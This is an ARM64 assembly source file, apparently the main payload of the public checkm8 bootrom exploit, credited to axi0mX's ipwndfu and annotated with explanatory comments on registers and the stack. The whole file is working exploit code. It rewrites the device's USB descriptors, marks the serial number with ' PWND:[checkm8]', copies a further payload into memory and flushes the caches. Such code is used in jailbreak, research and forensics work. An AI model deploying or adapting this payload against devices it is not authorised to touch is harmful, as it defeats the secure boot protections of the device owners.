// Main checkm8 payload

// Taken from axi0mX's ipwndfu

.text

// These are replaced when the payload is created
.pool
.set PAYLOAD_OFFSET,               0xBAD00006
.set PAYLOAD_SIZE,                 0xBAD00007
.set PAYLOAD_DEST,                 0xBAD00005
.set PAYLOAD_PTR,                  0xBAD00008
.set gUSBSerialNumber,             0xBAD00002
.set gUSBSRNMStringDescriptor,     0xBAD00004
.set gUSBDescriptors,              0xBAD00001
.set usb_create_string_descriptor, 0xBAD00003

// Notes:
//  SP - Stack Pointer, holds the address of the top of the stack
//  FP - Frame Pointer, holds the address of the current stack frame
//  LR - Link Register, holds the address to return to when a function returns
//  x0 - x30 are general purpose registers but:
//        x29 - Frame Pointer
//        x30 - Link Register
//  x19 seems to be important, as it is set to 0 to stop
//  the USB request holding the payload from being freed?

.global _main
_main:
  // Prevent the USB request holding the payload from being freed?
  MOV  X19, #0                      // HACK: do not free this usb request


  STP  X29, X30, [SP,#-0x10]!       // store LR, FP into stack frame
                                    // x29 and x30 are both 64 bit registers, or 8 bytes each, so sp - 0x10
                                    // is used because x29 and x30 have a combined size of 16 bytes AKA 0x10
                                    // and they are stored in the 16 bytes before the stack pointer
                                    // x29 holds the previous frame pointer, and x30 holds the previous link register
                                    // they are saved to the stack so that they can be restored later



  MOV  X29, SP                      // set FP to current stack pointer

  LDR  X0, =gUSBDescriptors         // load address of gUSBDescriptors into x0
  LDP  X0, X1, [X0]                 // load x0 and x1 from address in x0 and x0 + 0x10
  ADR  X2, USB_DESCRIPTOR           // load address of USB_DESCRIPTOR into x2
  LDP  X3, X4, [X2]                 // load x3 and x4 from address in x2 and x2 + 0x10
  STP  X3, X4, [X0]                 // store x3 and x4 into address in x0 and x0 + 0x10
  STP  X3, X4, [X1]                 // store x3 and x4 into address in x1 and x1 + 0x10
  LDP  X3, X4, [X2,#0x10]           // load x3 and x4 from address in x2 + 0x10
  STP  X3, X4, [X0,#0x10]           // store x3 and x4 into address in x0 + 0x10
  STP  X3, X4, [X1,#0x10]           // store x3 and x4 into address in x1 + 0x10

  LDR  X0, =gUSBSerialNumber
find_zero_loop:
  ADD  X0, X0, #1                   // increment x0 by 1
  LDRB W1, [X0]                     // load byte from address in x0 into w1
  CBNZ W1, find_zero_loop           // compare w1 to 0, branch to find_zero_loop if not equal to 0

  ADR  X1, PWND_STRING              // load address of PWND_STRING into x1
  LDP  X2, X3, [X1]                 // load x2 and x3 from address in x1 and x1 + 0x10
  STP  X2, X3, [X0]                 // store x2 and x3 into address in x0 and x0 + 0x10

  LDR  X0, =gUSBSerialNumber        // load address of gUSBSerialNumber into x0
  LDR  X1, =usb_create_string_descriptor // load address of usb_create_string_descriptor into x1
  BLR  X1                           // branch to address in x1 and link return address 
                                    // so the function returns to the next instruction

  LDR  X1, =gUSBSRNMStringDescriptor  // load address of gUSBSRNMStringDescriptor into x1
  STRB W0, [X1]                     // store byte from w0 into address in x1

  LDR  X0, =PAYLOAD_DEST            // load address of PAYLOAD_DEST into x0
  ADR  X1, _main                    // load address of _main into x1
  LDR  X2, =PAYLOAD_OFFSET          // load address of PAYLOAD_OFFSET into x2
  ADD  X1, X1, X2                   // add x2 to x1 and store result in x1 - this is the address of the payload
  MOV  X2, #0                       // set x2 to 0
  LDR  X3, =PAYLOAD_SIZE            // load address of PAYLOAD_SIZE into x3
  LDR  X4, =PAYLOAD_PTR             // load address of PAYLOAD_PTR into x4
  ADD  X5, X0, #0x18                // add 0x18 to x0 and store result in x5 - payload destination + 0x18?
  STR  X5, [X4]                     // store x5 into address in x4

copy_loop:
  LDP  X3, X4,  [X1]                // load X3 and X4 from X1 and X1 + 0x10
  STP  X3, X4,  [X0]                // store X3 and X4 into X0 and X0 + 0x10
  LDP  X3, X4,  [X1,#0x10]          // load X3 and X4 from X1 + 0x10
  STP  X3, X4,  [X0,#0x10]          // store X3 and X4 into X0 + 0x10
  LDP  X3, X4,  [X1,#0x20]          // load X3 and X4 from X1 + 0x20
  STP  X3, X4,  [X0,#0x20]          // store X3 and X4 into X0 + 0x20
  LDP  X3, X4,  [X1,#0x30]          // load X3 and X4 from X1 + 0x30
  STP  X3, X4,  [X0,#0x30]          // store X3 and X4 into X0 + 0x30
  DC   CIVAC, X0                    // clean and invalidate cache line containing address in X0
  DMB  SY                           // ensure all memory accesses complete before next instruction
  ADD  X0, X0, #0x40                // increment X0 by 0x40
  ADD  X1, X1, #0x40                // increment X1 by 0x40
  ADD  X2, X2, #0x40                // increment X2 by 0x40
  CMP  X2, X3                       // compare X2 and X3
  B.CC copy_loop                    // branch to copy_loop if X2 is less than X3 (carry clear)

  SYS  #0, c7, c5, #0               // flush cache - #0 = cache maintainence operation, 
                                    // c7, c5 = coprocessor registers, #0 = clean and invalidate
  DSB  SY                           // ensure all memory accesses complete before next instruction
  ISB                               // flush instruction pipeline

  LDP  X29, X30, [SP],#0x10         // restore LR, FP from previous stack frame and return
                                    // SP still holds the address that was in x29, which was set to the 
                                    // previous FP from the function that branched to this payload
                                    // so we load the value at the address in SP to restore the previous
                                    // FP into x29, and then SP is incremented by the size of x29 (0x10)
                                    // to then restore this address into x30, which is the previous LR.
                                    // SP is then incremented by 0x10 again to have it point to the
                                    // next stack frame

  RET                               // return

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[checkm8]"